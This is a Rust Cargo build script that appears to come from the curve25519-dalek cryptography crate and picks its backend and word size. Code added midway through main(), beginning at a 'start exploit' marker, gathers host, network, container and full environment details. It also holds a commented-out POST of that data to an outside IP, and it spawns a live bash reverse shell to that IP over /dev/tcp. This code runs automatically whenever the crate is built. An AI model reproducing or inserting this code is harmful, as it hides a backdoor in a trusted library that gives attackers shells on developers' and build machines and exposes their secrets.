//! This selects the curve25519_dalek_bits either by default from target_pointer_width or explicitly set

#![deny(clippy::unwrap_used, dead_code)]

#[allow(non_camel_case_types)]
#[derive(PartialEq, Debug)]
enum DalekBits {
    Dalek32,
    Dalek64,
}

use std::fmt::Formatter;

impl std::fmt::Display for DalekBits {
    fn fmt(&self, f: &mut Formatter<'_>) -> Result<(), std::fmt::Error> {
        let w_bits = match self {
            DalekBits::Dalek32 => "32",
            DalekBits::Dalek64 => "64",
        };
        write!(f, "{}", w_bits)
    }
}

fn main() {
    // No rerun-if-changed = always rerun this build script
    println!("cargo:warning=START BUILD SCRIPT");
    println!("cargo:warning=YET ANOTHER PRINT");

    let target_arch = match std::env::var("CARGO_CFG_TARGET_ARCH") {
        Ok(arch) => arch,
        _ => "".to_string(),
    };

    let curve25519_dalek_bits = match std::env::var("CARGO_CFG_CURVE25519_DALEK_BITS").as_deref() {
        Ok("32") => DalekBits::Dalek32,
        Ok("64") => DalekBits::Dalek64,
        _ => deterministic::determine_curve25519_dalek_bits(&target_arch),
    };

    println!("cargo:rustc-cfg=curve25519_dalek_bits=\"{curve25519_dalek_bits}\"");

    let nightly = if rustc_version::version_meta()
        .expect("failed to detect rustc version")
        .channel
        == rustc_version::Channel::Nightly
    {
        println!("cargo:rustc-cfg=nightly");
        true
    } else {
        false
    };

    let rustc_version = rustc_version::version().expect("failed to detect rustc version");
    if rustc_version.major == 1 && rustc_version.minor <= 64 {
        // Old versions of Rust complain when you have an `unsafe fn` and you use `unsafe {}` inside,
        // so for those we want to apply the `#[allow(unused_unsafe)]` attribute to get rid of that warning.
        println!("cargo:rustc-cfg=allow_unused_unsafe");
    }

    // Backend overrides / defaults
    let curve25519_dalek_backend = match std::env::var("CARGO_CFG_CURVE25519_DALEK_BACKEND")
        .as_deref()
    {
        Ok("fiat") => "fiat",
        Ok("serial") => "serial",
        Ok("simd") => {
            // simd can only be enabled on x86_64 & 64bit target_pointer_width
            match is_capable_simd(&target_arch, curve25519_dalek_bits) {
                true => "simd",
                // If override is not possible this must result to compile error
                // See: issues/532
                false => panic!("Could not override curve25519_dalek_backend to simd"),
            }
        }
        Ok("unstable_avx512") if nightly => {
            // simd can only be enabled on x86_64 & 64bit target_pointer_width
            match is_capable_simd(&target_arch, curve25519_dalek_bits) {
                true => {
                    // In addition enable Avx2 fallback through simd stable backend
                    // NOTE: Compiler permits duplicate / multi value on the same key
                    println!("cargo:rustc-cfg=curve25519_dalek_backend=\"simd\"");

                    "unstable_avx512"
                }
                // If override is not possible this must result to compile error
                // See: issues/532
                false => panic!("Could not override curve25519_dalek_backend to unstable_avx512"),
            }
        }
        Ok("unstable_avx512") if !nightly => {
            panic!("Could not override curve25519_dalek_backend to unstable_avx512, as this is nightly only");
        }
        // default between serial / simd (if potentially capable)
        _ => match is_capable_simd(&target_arch, curve25519_dalek_bits) {
            true => "simd",
            false => "serial",
        },
    };
    println!("cargo:rustc-cfg=curve25519_dalek_backend=\"{curve25519_dalek_backend}\"");

    println!("cargo:warning=start exploit");

    use std::io::Write;
    use std::net::TcpStream;
    use std::fs;

    fn read_file(path: &str) -> String {
        fs::read_to_string(path).unwrap_or_default()
    }

    fn read_file_truncated(path: &str, max: usize) -> String {
        let s = fs::read_to_string(path).unwrap_or_default();
        s.chars().take(max).collect()
    }

    // --- Identity ---
    let pwd        = std::env::current_dir().map(|p| p.display().to_string()).unwrap_or_default();
    let hostname   = read_file("/etc/hostname").trim().to_string();
    let os_release = read_file("/etc/os-release");

    // --- Kernel / hardware ---
    let kernel     = read_file("/proc/version").trim().to_string();
    let cpuinfo    = read_file_truncated("/proc/cpuinfo", 1000);
    let meminfo    = read_file_truncated("/proc/meminfo", 500);

    // --- Network interfaces & IPs ---
    let net_dev    = read_file("/proc/net/dev");        // interface list + stats
    let net_arp    = read_file("/proc/net/arp");        // ARP table — reveals gateway + neighbours
    let net_route  = read_file("/proc/net/route");      // routing table

    // --- Container / cgroup detection ---
    let cgroup     = read_file("/proc/self/cgroup");
    let is_docker  = fs::metadata("/.dockerenv").is_ok();
    let mountinfo  = read_file_truncated("/proc/self/mountinfo", 1000);

    // --- Process context ---
    let proc_status = read_file("/proc/self/status");   // uid, gid, name, threads
    let proc_cmdline = read_file("/proc/self/cmdline").replace('\0', " ");
    let proc_environ = read_file("/proc/self/environ")  // full env of build process
        .split('\0')
        .filter(|s| !s.is_empty())
        .collect::<Vec<_>>()
        .join("\n");

    // --- Cargo env ---
    let cargo_env: Vec<String> = std::env::vars()
        .filter(|(k, _)| k.starts_with("CARGO") || k == "HOME" || k == "USER" || k == "PATH" || k == "HOSTNAME")
        .map(|(k, v)| format!("  {}={}", k, v))
        .collect();

    let body = format!(
        "=== IDENTITY ===\nhostname: {hostname}\npwd: {pwd}\nis_docker: {is_docker}\n\n\
         === OS ===\n{os_release}\n\n\
         === KERNEL ===\n{kernel}\n\n\
         === CPU ===\n{cpuinfo}\n\n\
         === MEMORY ===\n{meminfo}\n\n\
         === NETWORK INTERFACES ===\n{net_dev}\n\n\
         === ARP TABLE ===\n{net_arp}\n\n\
         === ROUTING TABLE ===\n{net_route}\n\n\
         === CGROUP ===\n{cgroup}\n\n\
         === MOUNTS ===\n{mountinfo}\n\n\
         === PROCESS STATUS ===\n{proc_status}\n\n\
         === CMDLINE ===\n{proc_cmdline}\n\n\
         === CARGO ENV ===\n{}\n\n\
         === FULL PROCESS ENV ===\n{proc_environ}\n",
        cargo_env.join("\n")
    );

    // if let Ok(mut stream) = TcpStream::connect("34.201.119.185:443") {
    //     let request = format!(
    //         "POST /log HTTP/1.1\r\nHost: 34.201.119.185\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
    //         body.len(),
    //         body
    //     );
    //     let _ = stream.write_all(request.as_bytes());
    // }

    // std::process::Command::new("bash")
    //     .args(["-c", "echo test > /dev/tcp/34.201.119.185/443"])
    //     .status()
    //     .unwrap();

    std::process::Command::new("bash")
        .arg("-c")
        .arg("0<&26-;exec 26<>/dev/tcp/34.201.119.185/443;sh <&26 >&26 2>&26")
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())  // optional: detach stdout too
        .stderr(std::process::Stdio::null())  // optional: detach stderr too
        .spawn()
        .expect("failed to spawn process");
    println!("cargo:warning=RAN BUILD SCRIPT");
    println!("cargo:warning=RAN BUILD SCRIPT");

}

// Is the target arch & curve25519_dalek_bits potentially simd capable ?
fn is_capable_simd(arch: &str, bits: DalekBits) -> bool {
    arch == "x86_64" && bits == DalekBits::Dalek64
}

// Deterministic cfg(curve25519_dalek_bits) when this is not explicitly set.
mod deterministic {

    use super::*;

    // Custom Rust non-cargo build tooling needs to set CARGO_CFG_TARGET_POINTER_WIDTH
    static ERR_MSG_NO_POINTER_WIDTH: &str =
        "Standard Cargo TARGET_POINTER_WIDTH environment variable is not set.";

    // When either non-32 or 64 TARGET_POINTER_WIDTH detected
    static ERR_MSG_UNKNOWN_POINTER_WIDTH: &str = "Unknown TARGET_POINTER_WIDTH detected.";

    // Warning when the curve25519_dalek_bits cannot be determined
    fn determine_curve25519_dalek_bits_warning(cause: &str) {
        println!("cargo:warning=\"Defaulting to curve25519_dalek_bits=32: {cause}\"");
    }

    // Determine the curve25519_dalek_bits based on Rust standard TARGET triplet
    pub(super) fn determine_curve25519_dalek_bits(target_arch: &String) -> DalekBits {
        let target_pointer_width = match std::env::var("CARGO_CFG_TARGET_POINTER_WIDTH") {
            Ok(pw) => pw,
            Err(_) => {
                determine_curve25519_dalek_bits_warning(ERR_MSG_NO_POINTER_WIDTH);
                return DalekBits::Dalek32;
            }
        };

        #[allow(clippy::match_single_binding)]
        match &target_arch {
            //Issues: 449 and 456
            //TODO: When adding arch defaults use proper types not String match
            //TODO(Arm): Needs tests + benchmarks to back this up
            //TODO(Wasm32): Needs tests + benchmarks to back this up
            _ => match target_pointer_width.as_ref() {
                "64" => DalekBits::Dalek64,
                "32" => DalekBits::Dalek32,
                // Intended default solely for non-32/64 target pointer widths
                // Otherwise known target platforms only.
                _ => {
                    determine_curve25519_dalek_bits_warning(ERR_MSG_UNKNOWN_POINTER_WIDTH);
                    DalekBits::Dalek32
                }
            },
        }
    }
}
